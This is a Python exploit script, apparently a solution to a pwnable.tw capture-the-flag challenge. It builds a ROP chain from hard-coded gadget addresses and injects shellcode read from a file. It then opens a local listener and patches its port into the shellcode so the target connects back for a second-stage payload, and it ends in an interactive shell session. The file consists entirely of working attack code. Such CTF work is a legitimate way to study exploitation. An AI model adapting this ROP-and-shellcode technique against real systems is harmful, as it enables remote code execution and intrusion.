from PwnIOI import *
#s = IOI(['192.168.0.85',1234])
s = IOI(['chall.pwnable.tw',10303])
raw_input()
gadget1 = 0x080e2d35 # and ebx, edi ; jmp eax
gadget2 = 0x080483c7 # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
gadget3 = 0x0808ca22 # add ecx, dword ptr [ebp + 0x5f5e0346] ; ret
gadget4 = 0x080997d0 # add dword ptr [ebx + 0x80eba08], esp ; ret
gadget5 = 0x0807a589 # add al, 0x13 ; pop ebx ; pop esi ; ret
gadget6 = 0x080b8536 # pop eax ; ret
gadget8 = 0x08063caa # inc ebp ; pop ebx ; ret
gadget8 = 0x0804f0fa # mov eax, ebx ; pop ebx ; ret
gadget9 = 0x080593df # push ecx ; call eax
gadget10 = 0x0804d873 # mov dword ptr [edx + 0x18], eax ; ret
gadget11 = 0x08053fe0 # add eax, ebx ; pop ebx ; ret
gadget12 = 0x0806ec8b # pop edx ; ret
gadget13 = 0x08048480 # pop edi ; ret
gadget14 = 0x080583c9 # pop ecx ; ret
gadget15 = 0x0806ecb1 # pop ecx ; pop ebx ; ret
gadget16 = 0x0807aebc # add dword ptr [ebp - 0x76308a0a], eax ; ret 0x48d
open_func = 0x806d110
read = 0x806D180
mprotect = 0x806dd40
free_space = 0x80ec524
f = open('sc','r')
sc = f.read()
f.close()
svr_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
svr_sock.settimeout(3)
svr_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
svr_sock.bind(('0.0.0.0', 0))
svr_name, svr_port = svr_sock.getsockname()
sc = sc.replace("\x05\x39",struct.pack('<H',svr_port)[::-1])
rop = "A"*8
rop += p32(0x80E9FEC+0x76308a0a)
rop += p32(gadget6)
rop += p32(0x7)
rop += p32(gadget12)
rop += p32(0x80E9FEC-0x18)
rop += p32(gadget10)
rop += p32(gadget6)
rop += p32(0x80E9FC8)
rop += p32(0x809A080)
rop += p32(0x080bd13b) # jmp esp
rop += sc
print len(rop)
print("+=======+STEP+======= %s:%d" % (svr_name, svr_port))
svr_sock.listen(5)
s.write(rop)
f = open('magic','r')
magic = f.read()
conn, client_address = svr_sock.accept()
conn.send('A'*12+p32(0x080bd13b)+magic)
s.interact()
